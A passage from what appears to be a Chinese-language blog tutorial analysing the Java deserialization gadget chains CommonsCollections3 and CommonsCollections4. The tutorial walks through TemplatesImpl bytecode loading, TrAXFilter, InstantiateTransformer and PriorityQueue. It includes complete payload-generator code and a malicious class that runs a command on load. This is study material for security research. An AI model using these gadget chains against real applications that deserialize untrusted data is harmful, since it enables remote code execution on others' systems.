src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc34.png" class="" title="pc34"><p>然后在defineTransletClasses()方法中_bytecodes为我们传入的字节码，也就是class文件。这里的_tfactory需要一个TransformerFactoryImpl 对象才能正常调用方法。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc35.png" class="" title="pc35"><p>再往后如果走if则else中的auxClasses不用赋值，但是在后面的if会判断transletIndex &lt; 0，因此能在前面的if里面通过transletIndex &#x3D; i;赋值，所以auxClasses就不用赋值了。这里的if是判断传入的字节码的父类要是ABSTRACT_TRANSLET，也就是需要继承这个包com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<br>这里必须恶意类要继承AbstractTranslet，这样就可以满足this.transletIndex &#x3D; i 下面的if判断transletIndex &lt; 0 就不会抛出异常（我的理解）</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc36.png" class="" title="pc36"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc37.png" class="" title="pc37"><p>恶意类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.testlearning;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.DOM;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.TransletException;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xml.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> org.apache.xml.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM dom, SerializationHandler[] serializationHandlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此就已经完成对TemplatesImpl链的分析。<br>现在要找到谁调用了newTransformer()像cc1一样直接用InvokerTransformer</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc38.png" class="" title="pc38"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc39.png" class="" title="pc39"><p>但是考虑到 InvokerTransformer出现在黑名单的概率比较高，所以大佬用了这个InstantiateTransformer来看看它怎么写的：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc40.png" class="" title="pc40"><p>可以看到这里用到了TrAXFilter这个类，我们去看看它的构造函数：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc41.png" class="" title="pc41"><p>原来TrAXFilter类的构造函数用了 newTransformer() 方法，并且前面的Templates对象可控，那么我们只需将这个类实例化，并且参数传进构造好的 templates 即可。而 InstantiateTransformer 这个类就是干这个事的，InstantiateTransformer的transform()方法就是通过反射获取构造函数来实例化一个类：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc42.png" class="" title="pc42"><p>所以我们可以利用这个类中的transform()来实例化TrAXFilter从而达到调用newTransformer()的目的：动态调试：主要看：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc43.png" class="" title="pc43"><p>在ChainedTransformer:transform</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc44.png" class="" title="pc44"><p>因为transformers[0]是new ConstantTransformer(TrAXFilter.class) 而ConstantTransformer的构造函数返回TrAXFilter的实例对象。</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc45.png" class="" title="pc45"><p>这里循环了一次后 现在的iTransformers[i]就是InstantiateTransformer的实例化对象，而这个对象带有两个属性在实例化之后构造函数给赋值的，也就是下面new Class[]{Templates.class}, new Object[]{templates}：templates就是TemplatesImpl链入口</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc46.png" class="" title="pc46"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br></code></pre></td></tr></table></figure><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc47.png" class="" title="pc47"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc48.png" class="" title="pc48"><p>object就是上一次的TrAXFilter返回的对象，此时调用transform:</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc49.png" class="" title="pc49"><p>this.iArgs就是我们的templates对象，而input就是传入的TrAxFilter，只要newInstance实例化就会触发TrAxFilter的构造函数：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc50.png" class="" title="pc50"><p>自然调用了newTransformer(),就和TemplatesImpl链对接了起来。</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.testlearning;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodeField.set(templates,codes);<br><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            instantiateTransformer&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashedMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map2.put(tiedMapEntry,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,instantiateTransformer);<br><br><br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(map2);<br>        <span class="hljs-comment">// oos.writeObject(finalEvilHandler);</span><br>        oos.flush();<br>        oos.close();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc51.png" class="" title="pc51"><p>CC4这条链用到了新的Commons-Collections4这个依赖，由于这个依赖与之前的版本具有较大的出入，连groupId和artifactId都变了，前者是Commons Collections⽼的版本包，当时版本号是3.2.1；后者是官⽅在2013年推出的4版本，当时版本号是4.0。因此算是更新换代了。但是在某种程度上还是换汤不换药，链的最后还是用了Transform类对象的transform()方法直接去执行代码，或者是CC3的利用TemplatesImpl类去实现类加载执行任意代码。因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p><p>我们找了 TransformingComparator.compare 进行字节码加载</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc52.png" class="" title="pc52"><p>看其构造函数：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc53.png" class="" title="pc53"><p>transformer可控，查看谁调用了compare,而且最好是直接就是重写了readObject()方法，能够直接走到compare()方法<br>java.util.PriorityQueue:</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc54.png" class="" title="pc54"><p>最后调用了heapify()</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc55.png" class="" title="pc55"><p>siftDown</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc56.png" class="" title="pc56"><p>接着调用了siftDownUsingComparator()方法，跟进：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc57.png" class="" title="pc57"><p>看comparator是否可控：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc58.png" class="" title="pc58"><p>到了这里可以看到调用了comparator对象的compare()方法，并且这里的comparator可以在PriorityQueue 类对象初始化的时候传进去的，因此我们可控，而TransformingComparator类恰恰是实现了Comparator和Serializable接口（而在旧的Commons-Collections包中TransformingComparator类没有实现Serializable接口，导致无法使用这条链），能够作为我们利用的对象。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">PriorityQueue.readObject<span class="hljs-function"><span class="hljs-params">()</span> --&gt;</span> PriorityQueue.heapify<span class="hljs-function"><span class="hljs-params">()</span> --&gt;</span> PriorityQueue.siftDown<span class="hljs-function"><span class="hljs-params">()</span> --&gt;</span> PriorityQueue.siftDownUsingComparator<span class="hljs-function"><span class="hljs-params">()</span> --&gt;</span> TransformingComparator.compare<span class="hljs-function"><span class="hljs-params">()</span> --&gt;</span> Transformer.transform()<br></code></pre></td></tr></table></figure><p>后面的部分就是CC1或CC3的写法了，这里以CC3为例，先把TemplatesImpl类对象构造好：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodeField.set(templates,codes);<br><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>            instantiateTransformer&#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(exp);<br>        oos.writeObject(priorityQueue);<br>        <span class="hljs-comment">// oos.writeObject(finalEvilHandler);</span><br>        oos.flush();<br>        oos.close();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(exp.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(out);<br><span class="hljs-comment">//        Object obj = ois.readObject();</span><br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是实际上是不能直接执行命令的，具体还需要看动态调试：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc59.png" class="" title="pc59"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc60.png" class="" title="pc60"><p>在heapify断下这里过不了判断直接跳过siftDown函数，而师傅们应对的方式是：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc61.png" class="" title="pc61"><p>加两个。但是还有一个问题：在add函数下断点：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc62.png" class="" title="pc62"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc63.png" class="" title="pc63"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc64.png" class="" title="pc64"><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc65.png" class="" title="pc65"><p>同样在序列化的时候会调用到compare从而执行命令，这不是我们想要的，还是用反射方法来解决：随便加一个常量</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc66.png" class="" title="pc66"><p>在add之后改回来：</p><img src="/2023/02/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsCollections%E9%93%BE/pc67.png" class="" title="pc67"><h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.testlearning;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.*;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br><br><br>        <span class="hljs-type">Field</span> <span 